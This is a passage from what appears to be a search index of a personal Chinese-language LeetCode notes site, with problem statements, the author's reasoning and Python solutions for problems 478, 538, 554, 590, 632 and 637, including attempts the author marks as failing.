\u8fd9\u6837\u53d6\u6837\u662f\u5426\u662f\u5747\u5300\u5206\u5e03\uff1f \u731c\u60f3\uff0c\u968f\u673a\u5f97\u5230\u7684\u70b9\u4f1a\u76f8\u5bf9\u96c6\u4e2d\u5728\u76f4\u7ebf y=self.x_center \u4e0a \u4f60\u4ed6\u5988\u6982\u7387\u8bba\u90fd\u8fd8\u7ed9\u8001\u5e08\u4e86\uff01 \u62d2\u7edd\u53d6\u6837\u554a\u64cd\uff01 \u65b9\u6846\u5185\u53d6\u70b9\uff0c\u7136\u540e\u5224\u65ad\u5728\u4e0d\u5728\u5706\u5185 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import random class Solution ( object ): def __init__ ( self , radius , x_center , y_center ): :type radius: float :type x_center: float :type y_center: float self . x_min , self . x_max = x_center - radius , x_center + radius self . y_min , self . y_max = y_center - radius , y_center + radius self . radius = radius self . x_center = x_center self . y_center = y_center def randPoint ( self ): :rtype: List[float] while True : x , y = random . uniform ( self . x_min , self . x_max ), random . uniform ( self . y_min , self . y_max ) if ( x - self . x_center ) ** 2 + ( y - self . y_center ) ** 2 = self . radius ** 2 : return [ x , y ]","title":"471 480"},{"location":"LeetCode/vol 4/471-480/#478","text":"\u7ed9\u5b9a\u534a\u5f84\u548c\u5706\u5fc3(x,y)\uff0c\u5b8c\u6210\u4e00\u4e2a\u51fd\u6570 randPoint \uff0c\u8be5\u51fd\u6570\u5728\u5706\u5185\u751f\u6210\u4e00\u4e2a\u5355\u72ec\u7684\u968f\u673a\u70b9 \u6ce8\u610f \u8f93\u5165\u548c\u8f93\u51fa\u90fd\u662f\u6d6e\u70b9\u6570 \u534a\u5f84\u548c\u5706\u5fc3\u70b9(x,y)\u4f20\u5165\u7c7b\u7684\u6784\u9020\u51fd\u6570 \u5706\u5468\u4e0a\u7684\u70b9\u662f\u5728\u5706\u5468 \u8fd4\u56de\u4e00\u4e2a\u957f\u5ea6\u4e3a2\u7684\u6570\u7ec4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Example 1: Input: [ Solution , randPoint , randPoint , randPoint ] [[1,0,0],[],[],[]] Output: [null,[-0.72939,-0.65505],[-0.78502,-0.28626],[-0.83119,-0.19803]] Example 2: Input: [ Solution , randPoint , randPoint , randPoint ] [[10,5,-7.5],[],[],[]] Output: [null,[11.52438,-8.33273],[2.46992,-16.21705],[11.13430,-12.42337]] \u60f3\u6cd5 emmm\uff0c\u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a\u968f\u673a\u7b97\u6cd5\uff1f \u5148\u5728x\u4e0a\u968f\u673a\uff1f\u7136\u540e\u8ba1\u7b97y\u503c\uff1f\u5728\u8fd9\u4e0a\u9762\u968f\u673a\uff1f \u8bd5\u8bd5\uff1f \\pm y_0 =\\pm \\sqrt{r^2 - x_0^2},x_0=random(x-r,x+r) \\pm y_0 =\\pm \\sqrt{r^2 - x_0^2},x_0=random(x-r,x+r) \u8fd9\u6837\uff1f \u6211\u89c9\u5f97\u4e0d\u884c\u3002\u3002\u3002\uff08\u4e0d\u884c\u539f\u56e0\u662f\u96be\u5ea6\uff0c\u89c9\u5f97\u6ca1\u8fd9\u4e48\u7b80\u5355\uff09 Todo \u8fd9\u6837\u53d6\u6837\u662f\u5426\u662f\u5747\u5300\u5206\u5e03\uff1f \u731c\u60f3\uff0c\u968f\u673a\u5f97\u5230\u7684\u70b9\u4f1a\u76f8\u5bf9\u96c6\u4e2d\u5728\u76f4\u7ebf y=self.x_center \u4e0a \u4f60\u4ed6\u5988\u6982\u7387\u8bba\u90fd\u8fd8\u7ed9\u8001\u5e08\u4e86\uff01 \u62d2\u7edd\u53d6\u6837\u554a\u64cd\uff01 \u65b9\u6846\u5185\u53d6\u70b9\uff0c\u7136\u540e\u5224\u65ad\u5728\u4e0d\u5728\u5706\u5185","title":"478"},{"location":"LeetCode/vol 4/471-480/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import random class Solution ( object ): def __init__ ( self , radius , x_center , y_center ): :type radius: float :type x_center: float :type y_center: float self . x_min , self . x_max = x_center - radius , x_center + radius self . y_min , self . y_max = y_center - radius , y_center + radius self . radius = radius self . x_center = x_center self . y_center = y_center def randPoint ( self ): :rtype: List[float] while True : x , y = random . uniform ( self . x_min , self . x_max ), random . uniform ( self . y_min , self . y_max ) if ( x - self . x_center ) ** 2 + ( y - self . y_center ) ** 2 = self . radius ** 2 : return [ x , y ]","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 5/531-540/","text":"538 \u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u5c06\u8fd9\u4e2a\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u6bcf\u4e2a\u8282\u70b9\u7684\u6bcf\u4e2a\u503c\u53d8\u6210\u6bd4\u5b83\u8fd8\u8981\u5927\u7684\u6bcf\u4e2a\u5143\u7d20\u7684\u548c\uff08\u5305\u62ec\u81ea\u5df1\uff09 1 2 3 4 5 6 7 8 9 Input: The root of a Binary Search Tree like this: 5 / \\ 2 13 Output: The root of a Greater Tree like this: 18 / \\ 20 13 \u60f3\u6cd5 \u9996\u5148\u8fd9\u662f\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u9700\u8981\u5229\u7528\u8fd9\u4e2a\u7684\u7279\u6027\uff0c\u540e\u7eed\u904d\u5386\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def convertBST ( self , root : TreeNode ) - TreeNode : self . valSum = 0 def __covertBSTHelper ( root : TreeNode ): if not root : return __covertBSTHelper ( root . right ) self . valSum += root . val root . val = self . valSum __covertBSTHelper ( root . left ) __covertBSTHelper ( root ) return root \u6cd5\u4e8c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def convertBST ( self , root : TreeNode ) - TreeNode : total = 0 stack = [] node = root while stack or node : while node : stack . append ( node ) node = node . right node = stack . pop () total += node . val node . val = total node = node . left return root","title":"531 540"},{"location":"LeetCode/vol 5/531-540/#538","text":"\u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u5c06\u8fd9\u4e2a\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u6bcf\u4e2a\u8282\u70b9\u7684\u6bcf\u4e2a\u503c\u53d8\u6210\u6bd4\u5b83\u8fd8\u8981\u5927\u7684\u6bcf\u4e2a\u5143\u7d20\u7684\u548c\uff08\u5305\u62ec\u81ea\u5df1\uff09 1 2 3 4 5 6 7 8 9 Input: The root of a Binary Search Tree like this: 5 / \\ 2 13 Output: The root of a Greater Tree like this: 18 / \\ 20 13 \u60f3\u6cd5 \u9996\u5148\u8fd9\u662f\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u9700\u8981\u5229\u7528\u8fd9\u4e2a\u7684\u7279\u6027\uff0c\u540e\u7eed\u904d\u5386\uff1f","title":"538"},{"location":"LeetCode/vol 5/531-540/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def convertBST ( self , root : TreeNode ) - TreeNode : self . valSum = 0 def __covertBSTHelper ( root : TreeNode ): if not root : return __covertBSTHelper ( root . right ) self . valSum += root . val root . val = self . valSum __covertBSTHelper ( root . left ) __covertBSTHelper ( root ) return root","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 5/531-540/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def convertBST ( self , root : TreeNode ) - TreeNode : total = 0 stack = [] node = root while stack or node : while node : stack . append ( node ) node = node . right node = stack . pop () total += node . val node . val = total node = node . left return root","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 5/551-560/","text":"554 \u6709\u4e00\u5835\u7816\u5899\uff0c\u5899\u662f\u77e9\u5f62\u7684\uff0c\u6709\u51e0\u6392\u7816\uff0c\u7816\u5177\u6709\u76f8\u540c\u7684\u9ad8\u5ea6\u4f46\u5bbd\u5ea6\u4e0d\u540c\u3002 \u9700\u8981\u8981\u4ece\u9876\u90e8\u5230\u5e95\u90e8\u7ed8\u5236\u4e00\u6761\u5782\u76f4\u7ebf\u5e76\u7a7f\u8fc7\u7684\u7816\u5757\u6700\u5c11\u3002 \u6bcf\u884c\u662f\u4e00\u4e2a\u6574\u6570\u5217\u8868\uff0c\u8868\u793a\u4ece\u5de6\u5230\u53f3\u7684\u6bcf\u884c\u4e2d\u6bcf\u4e2a\u7816\u7684\u5bbd\u5ea6\u3002 \u5982\u679c\u4f60\u7684\u7ebf\u7a7f\u8fc7\u7816\u7684\u8fb9\u7f18\uff0c\u90a3\u4e48\u7816\u4e0d\u88ab\u8ba4\u4e3a\u662f\u88ab\u7ebf\u6240\u4ea4\u53c9\u3002 \u8fd4\u56de\u4e00\u4e2a\u5782\u76f4\u753b\u7ebf\u65f6\uff0c\u53ef\u4ea4\u53c9\u7816\u5757\u6570\u91cf\u7684\u6700\u5c0f\u503c \u4e0d\u80fd\u6cbf\u7740\u5899\u7684\u4e24\u4e2a\u5782\u76f4\u8fb9\u7f18\u7684\u4efb\u610f\u4e00\u6761\u8fb9\u7f18\u753b\u7ebf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Input: [[1,2,2,1], [3,1,2], [1,3,2], [2,4], [3,1,2], [1,3,1,1]] } +-----+----------+----------+-----+ | | | } | | +-----+----------------+----+-----+ | | | | +-----+----------+----------------+ | | | | +-----+----+-----------+----------+ | | | | +----------+-----+-----+----------+ | | } | +-----+----------+-----------+----+ | | | | | +-----+----------------+-----+----+ } Output: 2 \u60f3\u6cd5 \u904d\u5386\u5417\uff1f \u7d2f\u52a0\u7684\u548c\u8981\u5c3d\u53ef\u80fd\u76f8\u7b49\uff0c\u5982\u679c\u90fd\u4e0d\u7b49\u7684\u8bdd\u3002\u3002\u3002\u3002 \u80af\u5b9a\u662f\u5728\u67d0\u6761\u7f1d\u4e0a dp=[{} for i in range(len(wall))] ? {0:{\u7ecf\u8fc7\u7684\u7816\u57570,\u7ecf\u8fc7\u7684\u7816\u57571}} \u67d0\u884c\u4e0a\u7b2c0\u5757\u7816\u540e\u7684\u90a3\u6761\u7f1d\u6240\u7ecf\u8fc7\u7684\u7816\u5757\u6570\u91cf \u4e0d\u8fc7\u600e\u6837\u8bbf\u95ee\u6240\u8bb0\u5f55\u7684\u72b6\u6001\u5462\uff1f \u4e0d\u4e0d\u4e0d\uff0c\u91cd\u70b9\u662f\u904d\u5386\u7f1d \u6cd5\u4e00 \u6211\u81ea\u5df1\u7684\u9519\u8bef\u4e86\uff0c\u73b0\u5728\u770b\u770b\u5176\u4ed6\u5199\u7684 \u6211\u4eec\u4ece\u4e0a\u5230\u4e0b\u904d\u5386\u6bcf\u5c42\uff0c\u4ece\u5de6\u5230\u53f3\u904d\u5386\u6bcf\u4e2a\u7816\u5757\u7684\u8fb9\u7f18\uff0c\u7528hashmap\u4fdd\u5b58\u6bcf\u4e2a\u8fb9\u7f18\u548c\u5de6\u8fb9\u754c\u7684\u8ddd\u79bb\u4ee5\u53ca\u8be5\u4f4d\u7f6e\u51fa\u73b0\u7684\u6b21\u6570\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u627e\u51fa\u67d0\u4e2a\u7a7a\u9699\u7684\u4f4d\u7f6e\u51fa\u73b0\u7684\u6b21\u6570\u6700\u591a\u5c31\u597d\u3002 \u7531\u4e8e\u662f\u6c42\u7a7f\u8fc7\u7684\u7816\u5757\u7684\u4e2a\u6570\uff0c\u6240\u4ee5\u9700\u8981\u7528\u7816\u5757\u7684\u884c\u6570\u51cf\u53bb\u5b54\u9699\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution ( object ): def leastBricks ( self , wall ): :type wall: List[List[int]] :rtype: int counter = {} ans = 0 for i in range ( len ( wall )): count = 0 for j in range ( len ( wall [ i ]) - 1 ): count += wall [ i ][ j ] counter [ count ] = counter . get ( count , 0 ) + 1 ans = max ( ans , counter [ count ]) return len ( wall ) - ans \u9519\u8bef Todo \u6ca1\u7528hashmap\uff0c\u4f46\u4e3a\u4ec0\u4e48\u4e0d\u884c\u5462\u3002\u3002\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Solution : def leastBricks ( self , wall ): row = [ 0 for i in range ( len ( wall ))] res = float ( inf ) # init for i in range ( len ( row )): row [ i ] += wall [ i ][ 0 ] rowBrickInCol = [ 0 for i in range ( len ( wall ))] if min ( row ) == sum ( wall [ 0 ]): return len ( wall ) while min ( row ) != sum ( wall [ 0 ]): currentMin = min ( row ) count = 0 if currentMin == sum ( wall [ 0 ]): break for i in range ( len ( row )): if row [ i ] currentMin : count += 1 elif row [ i ] sum ( wall [ 0 ]): rowBrickInCol [ i ] += 1 row [ i ] += wall [ i ][ rowBrickInCol [ i ]] if count res : res = count return res \u4e3a\u6bdb\u8fd9\u4e2a\u6ca1\u901a\u8fc7 [[1111111111111111111111111111......]]","title":"551 560"},{"location":"LeetCode/vol 5/551-560/#554","text":"\u6709\u4e00\u5835\u7816\u5899\uff0c\u5899\u662f\u77e9\u5f62\u7684\uff0c\u6709\u51e0\u6392\u7816\uff0c\u7816\u5177\u6709\u76f8\u540c\u7684\u9ad8\u5ea6\u4f46\u5bbd\u5ea6\u4e0d\u540c\u3002 \u9700\u8981\u8981\u4ece\u9876\u90e8\u5230\u5e95\u90e8\u7ed8\u5236\u4e00\u6761\u5782\u76f4\u7ebf\u5e76\u7a7f\u8fc7\u7684\u7816\u5757\u6700\u5c11\u3002 \u6bcf\u884c\u662f\u4e00\u4e2a\u6574\u6570\u5217\u8868\uff0c\u8868\u793a\u4ece\u5de6\u5230\u53f3\u7684\u6bcf\u884c\u4e2d\u6bcf\u4e2a\u7816\u7684\u5bbd\u5ea6\u3002 \u5982\u679c\u4f60\u7684\u7ebf\u7a7f\u8fc7\u7816\u7684\u8fb9\u7f18\uff0c\u90a3\u4e48\u7816\u4e0d\u88ab\u8ba4\u4e3a\u662f\u88ab\u7ebf\u6240\u4ea4\u53c9\u3002 \u8fd4\u56de\u4e00\u4e2a\u5782\u76f4\u753b\u7ebf\u65f6\uff0c\u53ef\u4ea4\u53c9\u7816\u5757\u6570\u91cf\u7684\u6700\u5c0f\u503c \u4e0d\u80fd\u6cbf\u7740\u5899\u7684\u4e24\u4e2a\u5782\u76f4\u8fb9\u7f18\u7684\u4efb\u610f\u4e00\u6761\u8fb9\u7f18\u753b\u7ebf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 Input: [[1,2,2,1], [3,1,2], [1,3,2], [2,4], [3,1,2], [1,3,1,1]] } +-----+----------+----------+-----+ | | | } | | +-----+----------------+----+-----+ | | | | +-----+----------+----------------+ | | | | +-----+----+-----------+----------+ | | | | +----------+-----+-----+----------+ | | } | +-----+----------+-----------+----+ | | | | | +-----+----------------+-----+----+ } Output: 2 \u60f3\u6cd5 \u904d\u5386\u5417\uff1f \u7d2f\u52a0\u7684\u548c\u8981\u5c3d\u53ef\u80fd\u76f8\u7b49\uff0c\u5982\u679c\u90fd\u4e0d\u7b49\u7684\u8bdd\u3002\u3002\u3002\u3002 \u80af\u5b9a\u662f\u5728\u67d0\u6761\u7f1d\u4e0a dp=[{} for i in range(len(wall))] ? {0:{\u7ecf\u8fc7\u7684\u7816\u57570,\u7ecf\u8fc7\u7684\u7816\u57571}} \u67d0\u884c\u4e0a\u7b2c0\u5757\u7816\u540e\u7684\u90a3\u6761\u7f1d\u6240\u7ecf\u8fc7\u7684\u7816\u5757\u6570\u91cf \u4e0d\u8fc7\u600e\u6837\u8bbf\u95ee\u6240\u8bb0\u5f55\u7684\u72b6\u6001\u5462\uff1f \u4e0d\u4e0d\u4e0d\uff0c\u91cd\u70b9\u662f\u904d\u5386\u7f1d","title":"554"},{"location":"LeetCode/vol 5/551-560/#_1","text":"\u6211\u81ea\u5df1\u7684\u9519\u8bef\u4e86\uff0c\u73b0\u5728\u770b\u770b\u5176\u4ed6\u5199\u7684 \u6211\u4eec\u4ece\u4e0a\u5230\u4e0b\u904d\u5386\u6bcf\u5c42\uff0c\u4ece\u5de6\u5230\u53f3\u904d\u5386\u6bcf\u4e2a\u7816\u5757\u7684\u8fb9\u7f18\uff0c\u7528hashmap\u4fdd\u5b58\u6bcf\u4e2a\u8fb9\u7f18\u548c\u5de6\u8fb9\u754c\u7684\u8ddd\u79bb\u4ee5\u53ca\u8be5\u4f4d\u7f6e\u51fa\u73b0\u7684\u6b21\u6570\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u627e\u51fa\u67d0\u4e2a\u7a7a\u9699\u7684\u4f4d\u7f6e\u51fa\u73b0\u7684\u6b21\u6570\u6700\u591a\u5c31\u597d\u3002 \u7531\u4e8e\u662f\u6c42\u7a7f\u8fc7\u7684\u7816\u5757\u7684\u4e2a\u6570\uff0c\u6240\u4ee5\u9700\u8981\u7528\u7816\u5757\u7684\u884c\u6570\u51cf\u53bb\u5b54\u9699\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution ( object ): def leastBricks ( self , wall ): :type wall: List[List[int]] :rtype: int counter = {} ans = 0 for i in range ( len ( wall )): count = 0 for j in range ( len ( wall [ i ]) - 1 ): count += wall [ i ][ j ] counter [ count ] = counter . get ( count , 0 ) + 1 ans = max ( ans , counter [ count ]) return len ( wall ) - ans","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 5/551-560/#_2","text":"Todo \u6ca1\u7528hashmap\uff0c\u4f46\u4e3a\u4ec0\u4e48\u4e0d\u884c\u5462\u3002\u3002\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Solution : def leastBricks ( self , wall ): row = [ 0 for i in range ( len ( wall ))] res = float ( inf ) # init for i in range ( len ( row )): row [ i ] += wall [ i ][ 0 ] rowBrickInCol = [ 0 for i in range ( len ( wall ))] if min ( row ) == sum ( wall [ 0 ]): return len ( wall ) while min ( row ) != sum ( wall [ 0 ]): currentMin = min ( row ) count = 0 if currentMin == sum ( wall [ 0 ]): break for i in range ( len ( row )): if row [ i ] currentMin : count += 1 elif row [ i ] sum ( wall [ 0 ]): rowBrickInCol [ i ] += 1 row [ i ] += wall [ i ][ rowBrickInCol [ i ]] if count res : res = count return res \u4e3a\u6bdb\u8fd9\u4e2a\u6ca1\u901a\u8fc7 [[1111111111111111111111111111......]]","title":"\u9519\u8bef"},{"location":"LeetCode/vol 5/581-590/","text":"590 \u7ed9\u5b9a\u4e00\u4e2an-ary\u6811\uff0c\u8fd4\u56de\u5176\u8282\u70b9\u503c\u7684\u540e\u5e8f\u904d\u5386 \u4f8b\u5982\uff0c\u7ed9\u5b9a\u4e00\u4e2a3-ary\u6811 \u5176\u540e\u5e8f\u904d\u5386\u4e3a [5,6,3,2,4,1]. \u60f3\u6cd5 \u5148\u4eff\u9020\u540e\u5e8f\u904d\u5386\u8bd5\u4e00\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def postorder ( self , root : Node ) - List [ int ]: if root is None : return [] res = [ root . val ] # \u9700\u8981\u62c6\u5f00 # [[[5],[6],3],[2],[4],1] child_val = [] for Node in root . children : if len ( self . postorder ( Node )) == 1 : child_val . append ( self . postorder ( Node )[ 0 ]) else : for node_val in self . postorder ( Node ): child_val . append ( node_val ) return child_val + res \u4e0d\u884c\u8d85\u65f6\u4e86 \u90a3\u4e48\u6709\u4ec0\u4e48\u5176\u4ed6\u7684\u65b9\u6cd5\u4e48\uff1f \u6cd5\u4e00 \u8fd9\u91cc\u770b\u4e86\u4e0b\u5176\u4ed6\u4eba\u7684\u9012\u5f52 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution : def postorder ( self , root ): :type root: Node :rtype: List[int] res = [] if root == None : return res def recursion ( root , res ): for child in root . children : recursion ( child , res ) res . append ( root . val ) recursion ( root , res ) return res \u6cd5\u4e8c \u65e2\u7136\u6709\u9012\u5f52\uff0c\u90a3\u4e48\u80af\u5b9a\u6709\u7528\u6808\u6765\u505a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def postorder ( self , root ): :type root: Node :rtype: List[int] res = [] if root == None : return res stack = [ root ] while stack : current = stack . pop () res . append ( current . val ) for node in current . children : stack . append ( node ) return res [:: - 1 ]","title":"581 590"},{"location":"LeetCode/vol 5/581-590/#590","text":"\u7ed9\u5b9a\u4e00\u4e2an-ary\u6811\uff0c\u8fd4\u56de\u5176\u8282\u70b9\u503c\u7684\u540e\u5e8f\u904d\u5386 \u4f8b\u5982\uff0c\u7ed9\u5b9a\u4e00\u4e2a3-ary\u6811 \u5176\u540e\u5e8f\u904d\u5386\u4e3a [5,6,3,2,4,1]. \u60f3\u6cd5 \u5148\u4eff\u9020\u540e\u5e8f\u904d\u5386\u8bd5\u4e00\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def postorder ( self , root : Node ) - List [ int ]: if root is None : return [] res = [ root . val ] # \u9700\u8981\u62c6\u5f00 # [[[5],[6],3],[2],[4],1] child_val = [] for Node in root . children : if len ( self . postorder ( Node )) == 1 : child_val . append ( self . postorder ( Node )[ 0 ]) else : for node_val in self . postorder ( Node ): child_val . append ( node_val ) return child_val + res \u4e0d\u884c\u8d85\u65f6\u4e86 \u90a3\u4e48\u6709\u4ec0\u4e48\u5176\u4ed6\u7684\u65b9\u6cd5\u4e48\uff1f","title":"590"},{"location":"LeetCode/vol 5/581-590/#_1","text":"\u8fd9\u91cc\u770b\u4e86\u4e0b\u5176\u4ed6\u4eba\u7684\u9012\u5f52 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution : def postorder ( self , root ): :type root: Node :rtype: List[int] res = [] if root == None : return res def recursion ( root , res ): for child in root . children : recursion ( child , res ) res . append ( root . val ) recursion ( root , res ) return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 5/581-590/#_2","text":"\u65e2\u7136\u6709\u9012\u5f52\uff0c\u90a3\u4e48\u80af\u5b9a\u6709\u7528\u6808\u6765\u505a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def postorder ( self , root ): :type root: Node :rtype: List[int] res = [] if root == None : return res stack = [ root ] while stack : current = stack . pop () res . append ( current . val ) for node in current . children : stack . append ( node ) return res [:: - 1 ]","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 6/631-640/","text":"632 Todo \u7ed9\u5b9a\u4e00\u7ec4\u7531\u5347\u5e8f\u6570\u5b57\u7ec4\u6210\u7684\u5217\u8868\uff0c\u5728\u8fd9\u4e9b\u6570\u5b57\u4e2d\u5bfb\u627e\u4e24\u4e2a\u76f8\u5dee\u6700\u5c0f\u7684\u6570\u5b57 a,b \uff0c\u4f7f\u5f97\u6bcf\u4e2a\u5217\u8868\u90fd\u81f3\u5c11\u6709\u4e00\u4e2a\u6570\u5b57\u5728\u8fd9\u4e24\u4e2a\u6570\u5b57 [a,b] \u7684\u8303\u56f4\u4e2d\uff0c\u82e5\u5b58\u5728\u4e24\u7ec4\u6570\u5b57 a,b c,d \u7684\u5dee\u503c\u4e00\u81f4\uff0c\u5373 a-b == c-d \uff0c\u90a3\u4e48\u9009\u62e9\u6570\u5b57\u66f4\u5c0f\u7684\u90a3\u7ec4 1 2 3 4 5 6 Input:[[4,10,15,24,26], [0,9,12,20], [5,18,22,30]] Output: [20,24] Explanation: List 1: [4, 10, 15, 24,26], 24 is in range [20,24]. List 2: [0, 9, 12, 20], 20 is in range [20,24]. List 3: [5, 18, 22, 30], 22 is in range [20,24]. \u60f3\u6cd5 \u9996\u5148\u60f3\u5230\u7684\u5c31\u662f\u52a8\u6001\u89c4\u5212\uff0c\u4f46\u662f\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u9700\u8981\u601d\u8003\u5982\u4f55\u5b9a\u4e49\u8f6c\u79fb\u65b9\u7a0b \u6216\u8005\u3002\u3002\u3002\u62c6\u6563\u540e\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\uff0c\u53d6\u6700\u5de6\u6700\u53f3\uff0c\u7136\u540e\u5411\u4e2d\u95f4\u903c\u8fd1\uff1f \u8fd9\u65f6\u5019\u80fd\u5426\u7528\u52a8\u6001\u89c4\u5212\uff1f \u7a81\u7136\u60f3\u8d77\u4e86\u80cc\u5305\u95ee\u9898 dp[]? dp[i]\u662f\u4ee5all_nums[i]\u4e3a\u622a\u6b62\u7684\u6570\u7ec4\u7684\u7b26\u5408\u9898\u610f\u6761\u4ef6\u7684\u6570\uff1f dp[][]? \u91cd\u70b9\u662f\u5982\u4f55\u63d0\u53d6\u3002\u3002\u3002\u3002 \u5148\u8bd5\u8bd5\u66b4\u529b\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class Solution : def smallestRange ( self , nums ): p = [ 0 for i in range ( len ( nums )) ] count = sum ([ len ( list_nums ) for list_nums in nums ]) all_nums = [] while count 0 : min_num = float ( INF ) record = 0 for index in range ( len ( p )): index_in_nums = p [ index ] if index_in_nums len ( nums [ index ]): if nums [ index ][ index_in_nums ] min_num : min_num = nums [ index ][ index_in_nums ] record = index p [ record ] += 1 all_nums . append ([ min_num , record ]) count -= 1 dp = [ 0 for i in range ( len ( all_nums ))] for i in range ( len ( all_nums )): record = set () for j in range ( i , len ( all_nums )): record . add ( all_nums [ j ][ 1 ]) if len ( record ) == len ( nums ): dp [ i ] = all_nums [ i ][ 0 ] , all_nums [ j ][ 0 ] break min_num = float ( INF ) res = [] for i in range ( len ( all_nums )): if dp [ i ] and dp [ i ][ 1 ] - dp [ i ][ 0 ] min_num : min_num = dp [ i ][ 1 ] - dp [ i ][ 0 ] res = dp [ i ] return res \u6211\u89c9\u5f97\u66b4\u529b\u7684\u65b9\u5f0f\u53ef\u4ee5\u7ee7\u7eed\u4f18\u5316\uff0c\u6bd4\u5982\u4f7f\u7528\u80cc\u5305\u95ee\u9898\u7684\u65b9\u5f0f \u6ed1\u52a8\u7a97\u53e3\uff1f 637 \u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u8fd4\u56de\u4e00\u4e2a\u7531\u6bcf\u5c42\u8282\u70b9\u7684\u503c\u7684\u5e73\u5747\u6570\u6240\u6784\u6210\u7684\u6570\u7ec4 1 2 3 4 5 6 7 8 9 Input: 3 / \\ 9 20 / \\ 15 7 Output: [3, 14.5, 11] Explanation: The average value of nodes on level 0 is 3, on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11]. \u60f3\u6cd5 \u5c42\u5e8f\u904d\u5386\u7684\u53d8\u4f53\u3002\u3002\u3002\u6ca1\u4ec0\u4e48\u60f3\u6cd5 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def averageOfLevels ( self , root ): current_level = [ root ] res = [] next_level = [] while current_level : count = 0 for node in current_level : if node : count += node . val if node . left : next_level . append ( node . left ) if node . right : next_level . append ( node . right ) res . append ( count / float ( len ( current_level ))) current_level = next_level next_level = [] return res","title":"631 640"},{"location":"LeetCode/vol 6/631-640/#632","text":"Todo \u7ed9\u5b9a\u4e00\u7ec4\u7531\u5347\u5e8f\u6570\u5b57\u7ec4\u6210\u7684\u5217\u8868\uff0c\u5728\u8fd9\u4e9b\u6570\u5b57\u4e2d\u5bfb\u627e\u4e24\u4e2a\u76f8\u5dee\u6700\u5c0f\u7684\u6570\u5b57 a,b \uff0c\u4f7f\u5f97\u6bcf\u4e2a\u5217\u8868\u90fd\u81f3\u5c11\u6709\u4e00\u4e2a\u6570\u5b57\u5728\u8fd9\u4e24\u4e2a\u6570\u5b57 [a,b] \u7684\u8303\u56f4\u4e2d\uff0c\u82e5\u5b58\u5728\u4e24\u7ec4\u6570\u5b57 a,b c,d \u7684\u5dee\u503c\u4e00\u81f4\uff0c\u5373 a-b == c-d \uff0c\u90a3\u4e48\u9009\u62e9\u6570\u5b57\u66f4\u5c0f\u7684\u90a3\u7ec4 1 2 3 4 5 6 Input:[[4,10,15,24,26], [0,9,12,20], [5,18,22,30]] Output: [20,24] Explanation: List 1: [4, 10, 15, 24,26], 24 is in range [20,24]. List 2: [0, 9, 12, 20], 20 is in range [20,24]. List 3: [5, 18, 22, 30], 22 is in range [20,24]. \u60f3\u6cd5 \u9996\u5148\u60f3\u5230\u7684\u5c31\u662f\u52a8\u6001\u89c4\u5212\uff0c\u4f46\u662f\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u9700\u8981\u601d\u8003\u5982\u4f55\u5b9a\u4e49\u8f6c\u79fb\u65b9\u7a0b \u6216\u8005\u3002\u3002\u3002\u62c6\u6563\u540e\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\uff0c\u53d6\u6700\u5de6\u6700\u53f3\uff0c\u7136\u540e\u5411\u4e2d\u95f4\u903c\u8fd1\uff1f \u8fd9\u65f6\u5019\u80fd\u5426\u7528\u52a8\u6001\u89c4\u5212\uff1f \u7a81\u7136\u60f3\u8d77\u4e86\u80cc\u5305\u95ee\u9898 dp[]? dp[i]\u662f\u4ee5all_nums[i]\u4e3a\u622a\u6b62\u7684\u6570\u7ec4\u7684\u7b26\u5408\u9898\u610f\u6761\u4ef6\u7684\u6570\uff1f dp[][]? 